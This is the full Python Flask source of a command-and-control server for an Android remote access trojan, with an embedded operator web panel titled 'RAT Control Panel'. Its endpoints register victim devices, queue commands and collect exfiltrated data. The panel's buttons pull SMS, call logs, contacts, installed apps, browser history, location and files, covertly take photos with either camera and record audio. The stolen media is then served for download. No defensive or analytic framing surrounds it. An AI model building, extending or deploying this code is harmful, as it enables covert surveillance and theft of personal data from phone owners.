from flask import Flask, request, jsonify, render_template_string
from datetime import datetime
import json
import os
import threading
import time
import base64

app = Flask(__name__)

# ---- Storage ----
log_entries = []
command_queue = []
command_results = {}
devices = {}
file_cache = {}  # Store base64 files temporarily: {cmd_id: {filename, base64_data, mime_type}}

try:
    with open('/tmp/rat_data.json') as f:
        saved = json.load(f)
        log_entries = saved.get('events', [])
        devices = saved.get('devices', {})
except:
    pass

def save_to_disk():
    with open('/tmp/rat_data.json', 'w') as f:
        json.dump({'events': log_entries, 'devices': devices}, f, indent=2)

def cleanup_stale_devices():
    while True:
        time.sleep(60)
        now = datetime.now().isoformat()
        stale = [d for d, info in devices.items() 
                 if (datetime.now() - datetime.fromisoformat(info.get('last_seen', now))).seconds > 300]
        for d in stale:
            del devices[d]

threading.Thread(target=cleanup_stale_devices, daemon=True).start()

# =============================================
# DEVICE ENDPOINTS
# =============================================

@app.route('/api/register', methods=['POST'])
def register_device():
    data = request.get_json()
    device_id = data.get('device_id', 'unknown')
    devices[device_id] = {
        'device_id': device_id,
        'model': data.get('model', 'Unknown'),
        'android_version': data.get('android_version', 'Unknown'),
        'first_seen': datetime.now().isoformat(),
        'last_seen': datetime.now().isoformat(),
        'ip': request.remote_addr,
        'online': True,
    }
    save_to_disk()
    return jsonify({'status': 'ok', 'device_id': device_id})

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.get_json()
    device_id = data.get('device_id', 'unknown')
    if device_id in devices:
        devices[device_id]['last_seen'] = datetime.now().isoformat()
        devices[device_id]['online'] = True
        devices[device_id]['ip'] = request.remote_addr
    save_to_disk()
    return jsonify({'status': 'ok'})

@app.route('/api/cmd', methods=['GET'])
def get_commands():
    device_id = request.args.get('device_id', 'unknown')
    
    if device_id in devices:
        devices[device_id]['last_seen'] = datetime.now().isoformat()
        devices[device_id]['online'] = True
    
    cmds = []
    remaining = []
    for cmd in command_queue:
        target = cmd.get('target_device', 'all')
        if target == 'all' or target == device_id:
            cmd['status'] = 'sent'
            cmd['sent_at'] = datetime.now().isoformat()
            cmds.append(cmd)
        else:
            remaining.append(cmd)
    
    command_queue.clear()
    command_queue.extend(remaining)
    
    return jsonify({'commands': cmds, 'queue_size': len(command_queue)})

@app.route('/api/result', methods=['POST'])
def post_result():
    data = request.get_json()
    cmd_id = data.get('cmd_id', 'unknown')
    data['server_received_at'] = datetime.now().isoformat()
    
    # Store file data if base64 is included
    result_data = data.get('result', {})
    if isinstance(result_data, dict):
        if 'base64_data' in result_data and result_data['base64_data']:
            file_cache[cmd_id] = {
                'filename': result_data.get('file_name', 'unknown'),
                'base64_data': result_data['base64_data'],
                'mime_type': result_data.get('mime_type', 'application/octet-stream'),
                'file_size': result_data.get('file_size', 0),
            }
            # Remove base64 from stored result to save memory (keep in file_cache)
            result_data['_has_file'] = True
            result_data.pop('base64_data', None)
    
    command_results[cmd_id] = data
    
    log_entries.append({
        'type': 'command_result',
        'timestamp': datetime.now().isoformat(),
        'data': data,
    })
    
    if len(log_entries) > 2000:
        log_entries.pop(0)
    
    save_to_disk()
    return jsonify({'status': 'ok'})

@app.route('/api/log', methods=['POST'])
def post_log():
    try:
        data = request.get_json()
        data['server_received_at'] = datetime.now().isoformat()
        log_entries.append(data)
        
        if len(log_entries) > 2000:
            log_entries.pop(0)
        
        save_to_disk()
        return jsonify({'status': 'ok', 'total_events': len(log_entries)})
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/api/log', methods=['GET'])
def get_logs():
    category = request.args.get('category', '').lower()
    if category:
        filtered = [e for e in log_entries if category in e.get('type', '').lower()]
        return jsonify({'total_events': len(filtered), 'category': category, 'events': filtered})
    return jsonify({'total_events': len(log_entries), 'events': log_entries})

# =============================================
# FILE ACCESS ENDPOINTS
# =============================================

@app.route('/api/file/<cmd_id>', methods=['GET'])
def get_file(cmd_id):
    """Serve a file as base64 or raw download."""
    file_info = file_cache.get(cmd_id)
    if not file_info:
        return jsonify({'error': 'File not found or expired'}), 404
    
    mode = request.args.get('mode', 'base64')
    
    if mode == 'raw':
        # Return raw bytes for download
        try:
            raw_data = base64.b64decode(file_info['base64_data'])
            from flask import Response
            return Response(
                raw_data,
                mimetype=file_info.get('mime_type', 'application/octet-stream'),
                headers={
                    'Content-Disposition': f'attachment; filename="{file_info["filename"]}"'
                }
            )
        except:
            return jsonify({'error': 'Invalid base64 data'}), 400
    
    # Return base64 with metadata
    return jsonify({
        'cmd_id': cmd_id,
        'filename': file_info['filename'],
        'mime_type': file_info.get('mime_type', 'application/octet-stream'),
        'file_size': file_info.get('file_size', 0),
        'base64_data': file_info['base64_data'],
    })

# =============================================
# OPERATOR ENDPOINTS
# =============================================

@app.route('/api/devices', methods=['GET'])
def get_devices():
    return jsonify({'devices': list(devices.values())})

@app.route('/api/send_cmd', methods=['POST'])
def send_command():
    data = request.get_json()
    cmd_id = f"cmd_{int(time.time() * 1000)}"
    
    command = {
        'cmd_id': cmd_id,
        'command': data.get('command', 'ping'),
        'params': data.get('params', {}),
        'target_device': data.get('target_device', 'all'),
        'created_at': datetime.now().isoformat(),
        'status': 'pending',
    }
    
    command_queue.append(command)
    save_to_disk()
    
    return jsonify({'status': 'ok', 'cmd_id': cmd_id, 'message': f'Command queued for {data.get("target_device", "all devices")}'})

@app.route('/api/result/<cmd_id>', methods=['GET'])
def get_result(cmd_id):
    result = command_results.get(cmd_id)
    if result:
        has_file = False
        result_data = result.get('result', {})
        if isinstance(result_data, dict):
            has_file = result_data.get('_has_file', False)
        return jsonify({'found': True, 'result': result, 'has_file': has_file})
    return jsonify({'found': False, 'message': 'Result not yet available'})

@app.route('/api/stats', methods=['GET'])
def get_stats():
    stats = {}
    for event in log_entries:
        event_type = event.get('type', 'unknown')
        if 'sms' in event_type.lower():
            cat = 'sms'
        elif 'call' in event_type.lower():
            cat = 'call'
        elif 'location' in event_type.lower():
            cat = 'location'
        elif 'photo' in event_type.lower() or 'camera' in event_type.lower() or 'capture' in event_type.lower():
            cat = 'camera'
        elif 'audio' in event_type.lower() or 'record' in event_type.lower() or 'mic' in event_type.lower():
            cat = 'audio'
        elif 'accessibility' in event_type.lower():
            cat = 'accessibility'
        elif 'file' in event_type.lower() or 'scan' in event_type.lower() or 'directory' in event_type.lower():
            cat = 'file'
        elif 'command' in event_type.lower():
            cat = 'command'
        else:
            cat = 'other'
        stats[cat] = stats.get(cat, 0) + 1
    
    return jsonify({
        'total_events': len(log_entries),
        'categories': stats,
        'devices_online': sum(1 for d in devices.values() if d.get('online')),
        'pending_commands': len(command_queue),
    })

# =============================================
# WEB CONTROL PANEL
# =============================================

@app.route('/')
def control_panel():
    return render_template_string(CONTROL_PANEL_HTML)

CONTROL_PANEL_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>RAT Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #0f0; min-height: 100vh; }
        .container { max-width: 1400px; margin: 0 auto; padding: 15px; }
        
        .header { 
            display: flex; justify-content: space-between; align-items: center;
            padding: 15px; background: #111; border-radius: 8px; margin-bottom: 15px;
            flex-wrap: wrap; gap: 10px;
        }
        .header h1 { font-size: 1.3rem; color: #0f0; }
        
        .grid { display: grid; grid-template-columns: 300px 1fr; gap: 15px; }
        @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } }
        
        .panel {
            background: #111; border: 1px solid #222; border-radius: 8px;
            padding: 15px; margin-bottom: 15px;
        }
        .panel h2 { font-size: 0.9rem; color: #0f0; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 1px; }
        
        .device-card {
            background: #0a0a0a; border: 1px solid #222; border-radius: 6px;
            padding: 10px; margin-bottom: 8px; font-size: 0.75rem; cursor: pointer;
        }
        .device-card.online { border-color: #0f0; }
        .device-card.offline { border-color: #f00; opacity: 0.5; }
        .device-card.selected { border-color: #0ff; background: #0a1a1a; }
        
        .cmd-btn {
            display: block; width: 100%; padding: 10px; margin: 5px 0;
            background: #1a1a1a; color: #0f0; border: 1px solid #333;
            border-radius: 4px; cursor: pointer; font-family: monospace;
            font-size: 0.8rem; text-align: left; transition: all 0.2s;
        }
        .cmd-btn:hover { background: #0f0; color: #0a0a0a; }
        .cmd-btn.danger { color: #f44; border-color: #f44; }
        .cmd-btn.danger:hover { background: #f44; color: #0a0a0a; }
        .cmd-btn.file-btn { color: #ff8; border-color: #ff8; }
        
        .output-area {
            background: #050505; border: 1px solid #222; border-radius: 6px;
            padding: 12px; min-height: 200px; max-height: 400px;
            overflow-y: auto; font-size: 0.75rem; white-space: pre-wrap;
            word-break: break-all;
        }
        
        .file-list { list-style: none; padding: 0; }
        .file-list li {
            padding: 6px 10px; margin: 2px 0; cursor: pointer;
            border-radius: 3px; font-size: 0.75rem;
        }
        .file-list li:hover { background: #1a3a1a; }
        .file-list li.folder { color: #ff0; }
        .file-list li.file { color: #0ff; }
        .file-list li.file:hover { background: #1a1a3a; }
        
        .copy-btn {
            background: #333; color: #0f0; border: 1px solid #0f0;
            padding: 4px 10px; border-radius: 3px; cursor: pointer;
            font-family: monospace; font-size: 0.7rem; margin: 4px;
        }
        .copy-btn:hover { background: #0f0; color: #000; }
        .copy-btn.copied { background: #0a0; color: #fff; }
        
        .image-preview { max-width: 100%; max-height: 300px; margin: 10px 0; border-radius: 4px; border: 1px solid #333; }
        .audio-player { width: 100%; margin: 10px 0; }
        
        .status-bar {
            display: flex; justify-content: space-between; align-items: center;
            padding: 8px 15px; background: #111; border-radius: 6px;
            font-size: 0.7rem; flex-wrap: wrap; gap: 10px;
        }
        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 5px; }
        .status-dot.online { background: #0f0; }
        .status-dot.offline { background: #f00; }
        
        .toast {
            position: fixed; top: 20px; right: 20px; padding: 12px 20px;
            border-radius: 6px; font-size: 0.8rem; z-index: 1000;
            animation: fadeIn 0.3s;
        }
        .toast.success { background: #0f0; color: #0a0a0a; }
        .toast.error { background: #f44; color: #fff; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
        
        .modal {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.8); z-index: 999; justify-content: center; align-items: center;
        }
        .modal.active { display: flex; }
        .modal-content {
            background: #111; border: 2px solid #0f0; border-radius: 8px;
            padding: 20px; max-width: 90%; max-height: 90%; overflow-y: auto;
        }
        .modal-close {
            float: right; color: #f44; cursor: pointer; font-size: 1.2rem;
            background: none; border: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ RAT Control Panel</h1>
            <div id="stats"></div>
        </div>
        
        <div class="status-bar">
            <span>Devices: <strong id="deviceCount">0</strong></span>
            <span>Events: <strong id="eventCount">0</strong></span>
            <span>Pending: <strong id="pendingCount">0</strong></span>
            <span id="lastUpdate">Last update: --</span>
            <button onclick="refreshAll()" style="background:#0f0;color:#000;border:none;padding:5px 10px;border-radius:3px;cursor:pointer;">🔄 Refresh</button>
        </div>
        
        <div class="grid">
            <!-- LEFT PANEL -->
            <div>
                <div class="panel">
                    <h2>📱 Devices</h2>
                    <div id="deviceList"><p style="color:#666;">No devices connected</p></div>
                </div>
                
                <div class="panel">
                    <h2>⚡ Commands</h2>
                    <button class="cmd-btn" onclick="sendCmd('get_sms_inbox')">📥 Get SMS Inbox</button>
                    <button class="cmd-btn" onclick="sendCmd('get_call_logs')">📞 Get Call Logs</button>
                    <button class="cmd-btn" onclick="sendCmd('get_contacts')">👥 Get Contacts</button>
                    <button class="cmd-btn" onclick="sendCmd('get_installed_apps')">📦 Installed Apps</button>
                    <button class="cmd-btn" onclick="sendCmd('capture_photo', {camera: 'back'})">📸 Capture Back Camera</button>
                    <button class="cmd-btn" onclick="sendCmd('capture_photo', {camera: 'front'})">🤳 Capture Front Camera</button>
                    <button class="cmd-btn" onclick="sendCmd('record_audio', {duration: 10})">🎙️ Record Audio (10s)</button>
                    <button class="cmd-btn" onclick="sendCmd('get_location')">📍 Get Location</button>
                    <button class="cmd-btn file-btn" onclick="sendCmd('scan_files', {path: '/storage/emulated/0'})">📁 Browse Files (Root)</button>
                    <button class="cmd-btn" onclick="sendCmd('get_chrome_history')">🌐 Chrome History</button>
                    <button class="cmd-btn danger" onclick="sendCmd('ping')">🔍 Ping</button>
                </div>
            </div>
            
            <!-- RIGHT PANEL -->
            <div>
                <div class="panel">
                    <h2>📋 Output</h2>
                    <div class="output-area" id="output">Select a device and send a command.</div>
                </div>
                
                <div class="panel">
                    <h2>📊 Recent Events</h2>
                    <div class="output-area" id="events" style="max-height:200px;">Loading...</div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Modal for viewing files -->
    <div class="modal" id="fileModal">
        <div class="modal-content">
            <button class="modal-close" onclick="closeModal()">✖</button>
            <div id="modalContent"></div>
        </div>
    </div>
    
    <div id="toastContainer"></div>
    
    <script>
        let selectedDevice = 'all';
        let devices = [];
        let currentBrowsingPath = null;
        
        function toast(msg, type) {
            const container = document.getElementById('toastContainer');
            const t = document.createElement('div');
            t.className = 'toast ' + type;
            t.textContent = msg;
            container.appendChild(t);
            setTimeout(() => t.remove(), 3000);
        }
        
        async function refreshAll() {
            await Promise.all([loadDevices(), loadStats(), loadEvents()]);
            document.getElementById('lastUpdate').textContent = 'Last update: ' + new Date().toLocaleTimeString();
        }
        
        async function loadDevices() {
            try {
                const res = await fetch('/api/devices');
                const data = await res.json();
                devices = data.devices || [];
                renderDevices();
                document.getElementById('deviceCount').textContent = devices.filter(d => d.online).length;
            } catch(e) {}
        }
        
        function renderDevices() {
            const container = document.getElementById('deviceList');
            if (devices.length === 0) {
                container.innerHTML = '<p style="color:#666;">No devices</p>';
                return;
            }
            container.innerHTML = devices.map(d => `
                <div class="device-card ${d.online ? 'online' : 'offline'} ${selectedDevice === d.device_id ? 'selected' : ''}"
                     onclick="selectDevice('${d.device_id}')">
                    <strong>${d.device_id}</strong><br>
                    ${d.model} | ${d.android_version}<br>
                    <span class="status-dot ${d.online ? 'online' : 'offline'}"></span>
                    ${d.online ? 'Online' : 'Offline'}
                </div>
            `).join('');
        }
        
        function selectDevice(id) {
            selectedDevice = id;
            renderDevices();
            document.getElementById('output').textContent = 'Selected: ' + id;
        }
        
        async function sendCmd(command, params = {}, isFileBrowse = false) {
            if (selectedDevice === 'all' && !confirm('Send to ALL devices?')) return;
            
            const output = document.getElementById('output');
            output.textContent = '⏳ Sending: ' + command + '...';
            
            try {
                const res = await fetch('/api/send_cmd', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        command: command,
                        params: params,
                        target_device: selectedDevice,
                    })
                });
                const data = await res.json();
                toast('Command sent: ' + data.message, 'success');
                
                if (isFileBrowse) {
                    currentBrowsingPath = params.path || '/storage/emulated/0';
                }
                
                output.textContent = '⏳ Waiting for device... (Cmd: ' + data.cmd_id + ')';
                pollResult(data.cmd_id, command);
            } catch(e) {
                toast('Failed: ' + e.message, 'error');
            }
        }
        
        async function pollResult(cmdId, command) {
            const output = document.getElementById('output');
            try {
                const res = await fetch('/api/result/' + cmdId);
                const data = await res.json();
                
                if (data.found) {
                    const result = data.result.result || {};
                    
                    if (command === 'scan_files' && result.files) {
                        renderFileBrowser(result, cmdId);
                    } else if (command === 'capture_photo' && data.has_file) {
                        renderPhotoResult(result, cmdId);
                    } else if (command === 'record_audio' && data.has_file) {
                        renderAudioResult(result, cmdId);
                    } else if (command === 'get_file_content' && data.has_file) {
                        renderFileContent(result, cmdId);
                    } else {
                        output.textContent = '✅ Result:\\n' + JSON.stringify(result, null, 2);
                    }
                } else {
                    output.textContent = '⏳ Still waiting... retrying in 5s';
                    setTimeout(() => pollResult(cmdId, command), 5000);
                }
            } catch(e) {
                setTimeout(() => pollResult(cmdId, command), 5000);
            }
        }
        
        function renderFileBrowser(result, cmdId) {
            const output = document.getElementById('output');
            const path = result.path || currentBrowsingPath;
            const files = result.files || [];
            
            let html = '<div style="margin-bottom:10px;">';
            html += '<strong>📁 ' + path + '</strong> ';
            html += '<small>(' + (result.count || files.length) + ' items)</small>';
            html += '</div>';
            html += '<button class="copy-btn" onclick="sendCmd(\'scan_files\', {path: \'' + getParentPath(path) + '\'}, true)">⬆ Parent</button>';
            html += '<hr style="border-color:#333;margin:8px 0;">';
            html += '<ul class="file-list">';
            
            for (const f of files) {
                const icon = f.isDirectory ? '📁' : '📄';
                const cssClass = f.isDirectory ? 'folder' : 'file';
                const onclick = f.isDirectory 
                    ? "sendCmd('scan_files', {path: '" + f.path + "'}, true)"
                    : "sendCmd('get_file_content', {path: '" + f.path + "', filename: '" + f.name + "'})";
                
                html += `<li class="${cssClass}" onclick="${onclick}">
                    ${icon} ${f.name} 
                    <span style="color:#666;font-size:0.7em;">${f.isDirectory ? '' : formatSize(f.size)}</span>
                </li>`;
            }
            
            if (files.length === 0) html += '<li style="color:#666;">Empty directory</li>';
            html += '</ul>';
            
            output.innerHTML = html;
        }
        
        function renderPhotoResult(result, cmdId) {
            const output = document.getElementById('output');
            output.innerHTML = `
                <div>
                    <strong>📸 Photo Captured</strong><br>
                    <small>Path: ${result.file_path || 'N/A'}</small><br>
                    <button class="copy-btn" onclick="viewFile('${cmdId}', 'image')">🖼️ View Image</button>
                    <button class="copy-btn" onclick="downloadFile('${cmdId}')">⬇ Download</button>
                    <button class="copy-btn" onclick="copyBase64('${cmdId}')">📋 Copy Base64</button>
                    <div id="preview_${cmdId}"></div>
                </div>
            `;
        }
        
        function renderAudioResult(result, cmdId) {
            const output = document.getElementById('output');
            output.innerHTML = `
                <div>
                    <strong>🎙️ Audio Recorded</strong><br>
                    <small>Path: ${result.file_path || 'N/A'}</small><br>
                    <button class="copy-btn" onclick="viewFile('${cmdId}', 'audio')">▶ Play Audio</button>
                    <button class="copy-btn" onclick="downloadFile('${cmdId}')">⬇ Download</button>
                    <button class="copy-btn" onclick="copyBase64('${cmdId}')">📋 Copy Base64</button>
                    <div id="preview_${cmdId}"></div>
                </div>
            `;
        }
        
        function renderFileContent(result, cmdId) {
            const output = document.getElementById('output');
            const mimeType = result.mime_type || 'application/octet-stream';
            const isImage = mimeType.startsWith('image/');
            const isAudio = mimeType.startsWith('audio/');
            
            output.innerHTML = `
                <div>
                    <strong>📄 File: ${result.file_name || 'N/A'}</strong><br>
                    <small>Size: ${formatSize(result.file_size || 0)} | Type: ${mimeType}</small><br>
                    ${isImage ? '<button class="copy-btn" onclick="viewFile(\'' + cmdId + '\', \'image\')">🖼️ View</button>' : ''}
                    ${isAudio ? '<button class="copy-btn" onclick="viewFile(\'' + cmdId + '\', \'audio\')">▶ Play</button>' : ''}
                    <button class="copy-btn" onclick="downloadFile('${cmdId}')">⬇ Download</button>
                    <button class="copy-btn" onclick="copyBase64('${cmdId}')">📋 Copy Base64</button>
                    <div id="preview_${cmdId}"></div>
                </div>
            `;
        }
        
        async function viewFile(cmdId, type) {
            const previewDiv = document.getElementById('preview_' + cmdId);
            try {
                const res = await fetch('/api/file/' + cmdId + '?mode=base64');
                const data = await res.json();
                
                if (type === 'image') {
                    previewDiv.innerHTML = `<img class="image-preview" src="data:${data.mime_type};base64,${data.base64_data}" alt="Preview">`;
                } else if (type === 'audio') {
                    previewDiv.innerHTML = `<audio class="audio-player" controls src="data:${data.mime_type};base64,${data.base64_data}"></audio>`;
                }
            } catch(e) {
                toast('Failed to load file', 'error');
            }
        }
        
        function downloadFile(cmdId) {
            window.open('/api/file/' + cmdId + '?mode=raw', '_blank');
        }
        
        async function copyBase64(cmdId) {
            try {
                const res = await fetch('/api/file/' + cmdId + '?mode=base64');
                const data = await res.json();
                await navigator.clipboard.writeText(data.base64_data);
                toast('✅ Base64 copied to clipboard! (' + formatSize(data.base64_data.length) + ' chars)', 'success');
            } catch(e) {
                toast('Failed to copy', 'error');
            }
        }
        
        function closeModal() {
            document.getElementById('fileModal').classList.remove('active');
        }
        
        function getParentPath(path) {
            const parts = path.split('/');
            parts.pop();
            return parts.join('/') || '/';
        }
        
        function formatSize(bytes) {
            if (!bytes || bytes === 0) return '0 B';
            if (bytes < 1024) return bytes + ' B';
            if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
            return (bytes / 1048576).toFixed(1) + ' MB';
        }
        
        async function loadStats() {
            try {
                const res = await fetch('/api/stats');
                const data = await res.json();
                document.getElementById('eventCount').textContent = data.total_events;
                document.getElementById('pendingCount').textContent = data.pending_commands;
            } catch(e) {}
        }
        
        async function loadEvents() {
            try {
                const res = await fetch('/api/log');
                const data = await res.json();
                const events = (data.events || []).slice(-20).reverse();
                document.getElementById('events').innerHTML = events.map(e => 
                    `<div style="margin-bottom:6px;border-left:3px solid ${getColor(e.type)};padding-left:8px;">
                        <span style="color:#888;">${(e.timestamp || '').substring(0,19)}</span>
                        <span style="color:#0ff;">[${e.type || 'unknown'}]</span>
                    </div>`
                ).join('') || '<p style="color:#666;">No events</p>';
            } catch(e) {}
        }
        
        function getColor(type) {
            if (type && type.includes('sms')) return '#0ff';
            if (type && type.includes('call')) return '#ff0';
            if (type && type.includes('photo') || (type && type.includes('camera'))) return '#f0f';
            if (type && type.includes('audio')) return '#f44';
            if (type && type.includes('file')) return '#f80';
            return '#888';
        }
        
        setInterval(refreshAll, 10000);
        refreshAll();
    </script>
</body>
</html>
'''

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)